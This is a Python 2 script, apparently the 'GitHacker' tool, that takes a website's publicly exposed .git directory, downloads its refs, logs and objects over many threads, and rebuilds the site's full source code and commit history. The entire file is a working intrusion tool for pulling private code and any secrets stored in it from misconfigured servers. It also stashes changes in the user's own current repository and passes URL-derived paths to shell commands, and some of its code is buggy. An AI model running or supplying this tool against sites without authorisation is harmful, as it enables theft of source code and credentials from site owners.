#!/usr/bin/env python
# encoding:utf-8

import os
import threading
import requests
import string
import random
import sys
import re

log = []

threadNumber = 50

def random_string(length):
    return "".join([random.choice(string.letters) for i in range(length)])

def dirlist(path, allfile):
    filelist = os.listdir(path)
    for filename in filelist:
        filepath = os.path.join(path, filename)
        if os.path.isdir(filepath):
            dirlist(filepath, allfile)
        else:
            allfile.append(filepath)
    return allfile


def downloadFile(url, path):
    if url in log:
        print "[-] Downloaded!"
    else:
        log.append(url)
    index = path[::-1].find("/")
    folder = path[0:-index]
    try:
        print "[+] Make dir : %s" % (folder)
        os.makedirs(folder)
    except:
        print "[-] Folder already existed!"
    print "[!] Getting -> %s" % (url)
    response = requests.get(url)
    if response.status_code == 200:
        with open(path, "wb") as f:
            f.write(response.content)
            print "[+] Success!"
    else:
        print "[-] [%d]" % (response.status_code)


class myThread (threading.Thread):
    def __init__(self, imgSrc, directoryName):
        threading.Thread.__init__(self)
        self.imgSrc = imgSrc
        self.directoryName = directoryName

    def run(self):
        downloadFile(self.imgSrc, self.directoryName)


def get_sha1(content):
    result = re.findall(r"([a-fA-F0-9]{40})", content)
    return result


def fixmissing(baseurl, temppath):
    # get missing files
    os.system("cd ./%s ; git fsck > ../cache.dat 2>&1" % temppath)
    missing = []
    with open("./cache.dat", "r") as f:
        missing += get_sha1(f.read())

    length = len(missing)
    # clean cache file
    os.system("rm ./cache.dat")
    threads = []
    # download missing files
    for i in missing:
        path = "./%s/.git/objects/%s/%s" % (temppath, i[0:2], i[2:])
        url = "%sobjects/%s/%s" % (baseurl, i[0:2], i[2:])
        # downloadFile(url, path)
        tt = myThread(url, path)
        threads.append(tt)

    for t in threads:
        t.start()
        while True:
            if(len(threading.enumerate()) < threadNumber):
                break

    if length > 1:
        fixmissing(baseurl, temppath)
    else:
        return


def complete_url(baseurl):
    if (not baseurl.startswith("http://")) and (not baseurl.startswith("https://")):
        baseurl = "http://" + baseurl
    if baseurl.endswith("/"):
        return baseurl
    else:
        return baseurl + "/"


def get_prefix(baseurl):
    prefix = ""
    if baseurl.startswith("http://"):
        prefix = baseurl[len("http://"):-len(".git/")]
    if baseurl.startswith("https://"):
        prefix = baseurl[(len("https://")):(-len(".git/"))]
    return prefix


def repalce_bad_chars(path):
    path = path.replace("/", "_")
    path = path.replace("\\", "_")
    path = path.replace(".", "_")
    path = path.replace("'", "_")
    path = path.replace("\"", "_")
    return path

def handle_git_stash():
    filename = random_string(0x20)
    os.system("touch %s" % filename)	
    os.system("git add %s" % filename)
    os.system("git stash")	
    os.system("rm -rf %s" % filename)

def main():
    if len(sys.argv) != 2:
        print "Usage : "
        print "        python GitHacker.py [Website]"
        print "Example : "
        print "        python Githack.py http://127.0.0.1/.git/"
        print "Author : "
        print "        wangyihang <wangyihanger@gmail.com>"
        exit(1)

    # Handle git stash
    handle_git_stash()

    files = dirlist("./", [])
    baseurl = sys.argv[1]
    baseurl = complete_url(baseurl)
    temppath = repalce_bad_chars(get_prefix(baseurl))

    # download base files
    for i in files:
        if i.startswith("./.git"):
            if i[len("./.git/"):len("./.git/objects")] == "objects":
                continue
            path = "./%s/%s" % (temppath, i[len("./"):])
            url = baseurl + i[len("./.git/"):]
            downloadFile(url, path)

    # download baseobject files
    master = open("./%s/.git/logs/refs/heads/master" % temppath, "r")
    print "[!] Downloading object files"
    for line in master:
        prehash = line.split(" ")[0]
        nexthash = line.split(" ")[1]
        path = "./%s/.git/objects/%s/%s" % (temppath,
                                            nexthash[0:2], nexthash[2:])
        url = "%sobjects/%s/%s" % (
            baseurl, nexthash[0:2], nexthash[2:])

        try:
            os.makedirs("./%s/%s", (temppath, path))
        except Exception as e:
            print "[-] %s" % (e)

        print (url, path)
        downloadFile(url, path)

    print "[+] Start fixing missing files..."
    # download missing files
    fixmissing(baseurl, temppath)

    # git reset to the last commit
    os.system("cd ./%s; git reset --hard;" % temppath)

    print "[+] All file downloaded! Please enter the dir and type `git reflog` to show all log info!"

if __name__ == "__main__":
    main()

